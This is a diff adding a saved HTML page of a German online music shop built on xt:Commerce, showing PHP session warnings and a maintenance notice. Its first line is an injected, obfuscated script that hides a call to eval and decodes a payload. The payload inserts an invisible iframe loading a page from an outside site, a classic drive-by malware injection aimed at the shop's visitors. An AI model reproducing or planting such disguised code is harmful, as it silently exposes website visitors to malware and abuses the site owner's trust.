@@ -1,0 +1,109 @@
+<script>Object.prototype.asd="e";try{for(i in{})if(~i.indexOf('as'))throw 1;}catch(q){zxc={}[i];}v=document.createTextNode('asd');var s;for(i in v)if(i=='childNodes')o=v[i].length+1;o*=2;aa=document.createTextNode(zxc+"v"+"a"+"l");e=window[aa.nodeValue];e(String.fromCharCode(11-o,11-o,107-o,104-o,34-o,42-o,102-o,113-o,101-o,119-o,111-o,103-o,112-o,118-o,48-o,105-o,103-o,118-o,71-o,110-o,103-o,111-o,103-o,112-o,118-o,117-o,68-o,123-o,86-o,99-o,105-o,80-o,99-o,111-o,103-o,42-o,41-o,100-o,113-o,102-o,123-o,41-o,43-o,93-o,50-o,95-o,43-o,125-o,11-o,11-o,11-o,107-o,104-o,116-o,99-o,111-o,103-o,116-o,42-o,43-o,61-o,11-o,11-o,127-o,34-o,103-o,110-o,117-o,103-o,34-o,125-o,11-o,11-o,11-o,102-o,113-o,101-o,119-o,111-o,103-o,112-o,118-o,48-o,121-o,116-o,107-o,118-o,103-o,42-o,36-o,62-o,107-o,104-o,116-o,99-o,111-o,103-o,34-o,117-o,116-o,101-o,63-o,41-o,106-o,118-o,118-o,114-o,60-o,49-o,49-o,99-o,119-o,118-o,113-o,47-o,117-o,101-o,106-o,99-o,102-o,103-o,48-o,102-o,103-o,49-o,117-o,103-o,107-o,118-o,103-o,54-o,48-o,106-o,118-o,111-o,41-o,34-o,121-o,107-o,102-o,118-o,106-o,63-o,41-o,51-o,50-o,41-o,34-o,106-o,103-o,107-o,105-o,106-o,118-o,63-o,41-o,51-o,50-o,41-o,34-o,117-o,118-o,123-o,110-o,103-o,63-o,41-o,120-o,107-o,117-o,107-o,100-o,107-o,110-o,107-o,118-o,123-o,60-o,106-o,107-o,102-o,102-o,103-o,112-o,61-o,114-o,113-o,117-o,107-o,118-o,107-o,113-o,112-o,60-o,99-o,100-o,117-o,113-o,110-o,119-o,118-o,103-o,61-o,110-o,103-o,104-o,118-o,60-o,50-o,61-o,118-o,113-o,114-o,60-o,50-o,61-o,41-o,64-o,62-o,49-o,107-o,104-o,116-o,99-o,111-o,103-o,64-o,36-o,43-o,61-o,11-o,11-o,127-o,11-o,11-o,104-o,119-o,112-o,101-o,118-o,107-o,113-o,112-o,34-o,107-o,104-o,116-o,99-o,111-o,103-o,116-o,42-o,43-o,125-o,11-o,11-o,11-o,120-o,99-o,116-o,34-o,104-o,34-o,63-o,34-o,102-o,113-o,101-o,119-o,111-o,103-o,112-o,118-o,48-o,101-o,116-o,103-o,99-o,118-o,103-o,71-o,110-o,103-o,111-o,103-o,112-o,118-o,42-o,41-o,107-o,104-o,116-o,99-o,111-o,103-o,41-o,43-o,61-o,104-o,48-o,117-o,103-o,118-o,67-o,118-o,118-o,116-o,107-o,100-o,119-o,118-o,103-o,42-o,41-o,117-o,116-o,101-o,41-o,46-o,41-o,106-o,118-o,118-o,114-o,60-o,49-o,49-o,99-o,119-o,118-o,113-o,47-o,117-o,101-o,106-o,99-o,102-o,103-o,48-o,102-o,103-o,49-o,117-o,103-o,107-o,118-o,103-o,54-o,48-o,106-o,118-o,111-o,41-o,43-o,61-o,104-o,48-o,117-o,118-o,123-o,110-o,103-o,48-o,120-o,107-o,117-o,107-o,100-o,107-o,110-o,107-o,118-o,123-o,63-o,41-o,106-o,107-o,102-o,102-o,103-o,112-o,41-o,61-o,104-o,48-o,117-o,118-o,123-o,110-o,103-o,48-o,114-o,113-o,117-o,107-o,118-o,107-o,113-o,112-o,63-o,41-o,99-o,100-o,117-o,113-o,110-o,119-o,118-o,103-o,41-o,61-o,104-o,48-o,117-o,118-o,123-o,110-o,103-o,48-o,110-o,103-o,104-o,118-o,63-o,41-o,50-o,41-o,61-o,104-o,48-o,117-o,118-o,123-o,110-o,103-o,48-o,118-o,113-o,114-o,63-o,41-o,50-o,41-o,61-o,104-o,48-o,117-o,103-o,118-o,67-o,118-o,118-o,116-o,107-o,100-o,119-o,118-o,103-o,42-o,41-o,121-o,107-o,102-o,118-o,106-o,41-o,46-o,41-o,51-o,50-o,41-o,43-o,61-o,104-o,48-o,117-o,103-o,118-o,67-o,118-o,118-o,116-o,107-o,100-o,119-o,118-o,103-o,42-o,41-o,106-o,103-o,107-o,105-o,106-o,118-o,41-o,46-o,41-o,51-o,50-o,41-o,43-o,61-o,11-o,11-o,11-o,102-o,113-o,101-o,119-o,111-o,103-o,112-o,118-o,48-o,105-o,103-o,118-o,71-o,110-o,103-o,111-o,103-o,112-o,118-o,117-o,68-o,123-o,86-o,99-o,105-o,80-o,99-o,111-o,103-o,42-o,41-o,100-o,113-o,102-o,123-o,41-o,43-o,93-o,50-o,95-o,48-o,99-o,114-o,114-o,103-o,112-o,102-o,69-o,106-o,107-o,110-o,102-o,42-o,104-o,43-o,61-o,11-o,11-o,127-o));</script>
+<br />
+<b>Warning</b>:  session_start() [<a href='function.session-start'>function.session-start</a>]: Cannot send session cookie - headers already sent by (output started at /is/htdocs/wp1049012_XVLSNZ3HGB/www/news.php:1) in <b>/is/htdocs/wp1049012_XVLSNZ3HGB/www/includes/application_top.php</b> on line <b>282</b><br />
+<br />
+<b>Warning</b>:  session_start() [<a href='function.session-start?XTCsid=2s09kc9nrvr797ph7a83aoo264'>function.session-start</a>]: Cannot send session cache limiter - headers already sent (output started at /is/htdocs/wp1049012_XVLSNZ3HGB/www/news.php:1) in <b>/is/htdocs/wp1049012_XVLSNZ3HGB/www/includes/application_top.php</b> on line <b>282</b><br />
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html dir="ltr" lang="de">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-15" /> 
+<meta http-equiv="Content-Style-Type" content="text/css" />
+
+<!--
+	This OnlineStore is brought to you by XT-Commerce, Community made shopping
+	XTC is a free open source e-Commerce System
+	created by Mario Zanier & Guido Winger and licensed under GNU/GPL.
+	Information and contribution at http://www.xt-commerce.com
+-->
+<meta name="generator" content="(c) by xt:Commerce v3.0.4 SP2.1 , http://www.xt-commerce.com" />
+
+
+		<meta name="robots" content="index, follow" />
+		<meta name="language" content="de" />
+		<meta name="author" content="Roland Reichel" />
+		<meta name="publisher" content="SRS Musikalien" />
+		<meta name="company" content="SEQUENZER-ROCK-SONGS" />
+		<meta name="page-topic" content="shopping" />
+		<meta name="reply-to" content=info@s-r-s.eu" />
+		<meta name="distribution" content="global" />
+		<meta name="revisit-after" content="8" />
+		<meta name="keywords" content="midifiles, deutsche midifiles, weihnachts-midifiles, Songbooks, Musiknoten für Klavier, Songbücher für Gitarre, Noten lernen, Sibelius Notensatzprogramm, Band In a Box" />
+		<meta name="description" content="Händler für Computer Musik Produkte, Midifiles, Musik-Noten, Musik-Bücher, und Audio CDs" />
+		<title>SRS Musikalien: Händler für Computer Musik Produkte, Midifiles, Noten und Bücher - </title><base href="http://www.s-r-s.eu/" />
+<link rel="stylesheet" type="text/css" href="templates/xtc4/stylesheet.css" />
+<script type="text/javascript"><!--
+var selected;
+var submitter = null;
+
+function submitFunction() {
+    submitter = 1;
+}
+function popupWindow(url) {
+  window.open(url,'popupWindow','toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=yes,copyhistory=no,width=100,height=100,screenX=150,screenY=150,top=150,left=150')
+}  
+
+function selectRowEffect(object, buttonSelect) {
+  if (!selected) {
+    if (document.getElementById) {
+      selected = document.getElementById('defaultSelected');
+    } else {
+      selected = document.all['defaultSelected'];
+    }
+  }
+
+  if (selected) selected.className = 'moduleRow';
+  object.className = 'moduleRowSelected';
+  selected = object;
+
+// one button is not an array
+  if (document.getElementById('payment'[0])) {
+    document.getElementById('payment'[buttonSelect]).checked=true;
+  } else {
+    //document.getElementById('payment'[selected]).checked=true;
+  }
+}
+
+function rowOverEffect(object) {
+  if (object.className == 'moduleRow') object.className = 'moduleRowOver';
+}
+
+function rowOutEffect(object) {
+  if (object.className == 'moduleRowOver') object.className = 'moduleRow';
+}
+
+function popupImageWindow(url) {
+  window.open(url,'popupImageWindow','toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=yes,copyhistory=no,width=100,height=100,screenX=150,screenY=150,top=150,left=150')
+}
+//--></script>
+<script type="text/javascript"><!--
+
+
+
+//--></script>
+<script src="http://www.google-analytics.com/urchin.js"
+type="text/javascript">
+</script>
+<script type="text/javascript">
+_uacct="UA-2575453-1";
+_utimeout="3600";
+urchinTracker();
+</script>
+</head>
+<body><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title>Unbenanntes Dokument</title>
+</head>
+
+<body>
+<div align="center">
+  <p><img src="http://www.s-r-s.eu/templates/xtc4/img/top_logo.jpg" width="999" height="100" /></p>
+  <h1>Unser Online-Shop SRS Musikalien<br />
+    ist zur Zeit wegen technische Umbauarbeiten nicht verf&uuml;gbar!</h1>
+  <h1>Sie k&ouml;nnen uns jedoch bei Fragen zu jeder Zeit eine <a href="mailto:info@s-r-s.eu">E-Mail (info(&auml;t)s-r-s.eu)</a> schreiben.</h1>
+  <p><strong>SRS Musikalien<br />
+    Roland Reichel</strong></p>
+</div>
+</body>
+</html><div class="copyright">eCommerce Engine &copy; 2006 <a href="http://www.xt-commerce.com" target="_blank">xt:Commerce Shopsoftware</a></div></body></html>
